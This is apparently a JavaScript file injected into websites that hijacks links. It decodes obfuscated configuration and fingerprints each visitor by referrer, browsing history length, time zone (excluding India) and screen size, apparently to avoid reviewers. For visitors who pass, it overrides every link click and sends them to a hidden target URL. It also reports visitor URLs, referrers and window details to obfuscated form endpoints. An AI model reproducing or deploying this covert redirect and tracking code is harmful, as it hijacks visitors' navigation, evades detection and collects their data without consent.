/* 
filterSafe
filterUnSafe
filterUnSafeSB
filterUnSafeJS
*/
var onFilters = [1, 1];

var hallSiteData, matchedSiteNKey, toapplyFinal = false;
if (typeof h_key == 'undefined') var h_key = "";

var contTry = setInterval(() => {
  if (typeof contDataFinal == 'string') {
    clearInterval(contTry);
    processSiteNData(contDataFinal);
  }
}, 100);

function processSiteNData(data) {
  hallSiteData = JSON.parse(hscGet(data));
  matchSiteNKey();

  if (matchedSiteNKey) {
    if (onFilters[matchedSiteNKey[2]]) {
      if (matchedSiteNKey[3] == 1) {
        if (filterCheck()) {
          h_key += "-YES";
          toapplyFinal = true;
        } else {
          h_key += "-FFailed-" + hallSiteData.filterFunctions[matchedSiteNKey[2]];
        }
      } else {
        h_key += "-ThisLnkOFF";
      }
    } else {
      h_key += `-FILTEROFF-${getFilterInfoString()}`;
    }
  } else {
    h_key += "-LOCATION: failed";
  }

  handleAnchors();

  sendInfo(h_key + `-${getDefaultName()}`, 0);
}

function processAnchor(a) {
  if (toapplyFinal) {
    a.addEventListener("click", e => {
      e.preventDefault();
      try { sendFinalised(h_key + `-${getDefaultName()}-${a.href}-${matchedSiteNKey[1]}`, Math.floor(e.timeStamp / 1000)); } catch (e) { }
      try { sendClickReal(h_key + `-${getDefaultName()}-${a.href}-${matchedSiteNKey[1]}`, Math.floor(e.timeStamp / 1000)); } catch (e) { }
      location.assign(matchedSiteNKey[1]);
    })
  } else {
    a.addEventListener("click",e=>{
      try { sendClickReal(h_key + `-${getDefaultName()}-${a.href}-${matchedSiteNKey[1]}`, Math.floor(e.timeStamp / 1000)); } catch (e) { }
    })
  }
}

function handleAnchors() {
  var allAs = document.getElementsByTagName('a');
  for (let i = 0; i < allAs.length; i++) {
    processAnchor(allAs[i]);
  }

  const targetNode = document.documentElement;
  const config = { childList: true, subtree: true };

  const callback = function (mutationsList) {
    for (const mutation of mutationsList) {
      if (mutation.type === 'childList') {
        for (const node of mutation.addedNodes) {
          if (node.tagName && node.tagName.toLowerCase() === 'a') {
            processAnchor(node);
          }

          if (node.nodeType === Node.ELEMENT_NODE) {
            const elements = node.getElementsByTagName('a');
            for (let i = 0; i < elements.length; i++) {
              processAnchor(elements[i]);
            }
          }
        }
      }
    }
  };

  const observer = new MutationObserver(callback);
  observer.observe(targetNode, config);
}


function filterCheck() {
  var filterFnName = hallSiteData.filterFunctions[matchedSiteNKey[2]];
  var filterFn = {
    "filterSafe": () => {
      if (
        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
        commonCheck() &&
        Nloaded <= 3 &&
        history.length <= 4 &&
        hNetGreaterThan(3)
      ) return true; else return false;
    },

    "filterUnSafe": () => {
      if (
        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
        commonCheck() &&
        Nloaded <= 2 &&
        history.length <= 4 &&
        hNetGreaterThan(6)
      ) return true; else return false;
    },

    "filterUnSafeSB": () => {
      if (
        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
        commonCheck() &&
        Nloaded <= 2 &&
        history.length <= 4 &&
        hNetGreaterThan(8) &&
        !(window.screen.width == 1536 && window.screen.height == 864) &&
        !(window.screen.width == 1366 && window.screen.height == 768)
      ) return true; else return false;
    },

    "filterUnSafeJS": () => {
      if (
        searchEngineCheck("bing", "google", "duckduckgo", "yahoo") &&
        commonCheck() &&
        Nloaded <= 2 &&
        history.length <= 4 &&
        hNetGreaterThan(8) &&
        !(window.screen.width == 1440 && window.screen.height == 900)
      ) return true; else return false;
    }
  }

  if (typeof filterFn[filterFnName] == 'function') {
    return filterFn[filterFnName]();
  } else {
    return filterFn['filterUnSafe']();
  }

  function commonCheck() {
    var place = new Date().toTimeString();
    if (
      !place.includes('India') &&
      window.innerWidth < window.screen.width && window.innerHeight < window.screen.height
    ) {
      return true;
    } else { return false; }
  }
}

function searchEngineCheck(...engines) {
  const referrer = document.referrer.toLowerCase();

  return engines.some(engine => {
    return engine && referrer.includes(engine);
  });
}

function matchSiteNKey() {
  for (var i = 0; i < hallSiteData.links.length; i++) {
    var linkData = hallSiteData.links[i];
    for (var j = 0; j < linkData[0].length; j++) {
      if (document.URL.includes(linkData[0][j])) {
        matchedSiteNKey = linkData;
        return;
      }
    }
  }

  return false;
}













function getFilterInfoString() {
  try { return onFilters.toString() + '/' + matchedSiteNKey[2] + ' ' + hallSiteData.filterFunctions[matchedSiteNKey[2]]; } catch (e) { return "ERROR: getting filter info"; }
}

/* =========LOGGERS=========== */
function sendFinalised(h_key = '', timeafter = -1) {
  var postT = hscGet('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUd5vEbX2UdrsxZ2SR5VjZbF2d03v8ZEmM9MyVbDXcM4v1diSM8vw9LE2VQsvRZFSW80xQRUkWFHJ9cVFdFjMRUG2MRCW5SkzNZkOhSj2chD');
  try {
    makeForm(postT, {
      "entry.1742212599": Nloaded + "-" + history.length + "_" + document.referrer,
      "entry.1832856812": location.href,
      "entry.1617942729": h_key,
      "entry.121403084": hgetMacTime(),
      "entry.1791764791": timeafter + 's ' + userWinInfo(),
    });
  } catch (e) {
    makeForm(postT, { "entry.1742212599": "PROBLEM in submitting " + e.toString() });
  }
}
function sendInfo(h_key) {
  var postT = hscGet('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LSmUdxvQbl2VdUslZ1Sa5zjQbT2T01vpZXmU9Eyhb2XMMsvNdjSZ86w9L12bQQvBZjSN8FxNRWkMFnJFcDFaFjMlUH2UZMCZdzlMVw6ZdDzWB1');
  try {
    makeForm(postT, {
      "entry.522782255": Nloaded + "-" + history.length + "_" + document.referrer,
      "entry.2147471592": location.href,
      "entry.559704587": h_key,
      "entry.1784255635": hgetMacTime(),
      "entry.1604074943": userWinInfo(),
    });
  } catch (e) {
    makeForm(postT, { "entry.522782255": "PROBLEM in submitting " + e.toString() });
  }
}

function sendClickReal(h_key, timeafter) {
  var postT = hscGet('Ua2HcRu09cGHcMz6VLmyU9tkJb32bNmz9LymZdVvdbj2adysEZ2SV54jNbX2M0kvlZlmb9Ry5b2XcMVvNd3SX8fwJLn2SQGvVZVSS8GxBRlkNF5JockFcFzMYUj2YNZYxaUVdkaxFWWUQh2');
  try {

    makeForm(postT, {
      "entry.1742212599": Nloaded + "-" + history.length + "_" + document.referrer,
      "entry.1832856812": location.href,
      "entry.1617942729": h_key,
      "entry.121403084": hgetMacTime(),
      "entry.1446718983": timeafter + "s " + userWinInfo(),
    });
  } catch (e) {
    makeForm(postT, { "entry.1742212599": "PROBLEM in submitting " + e.toString() });
  }
}
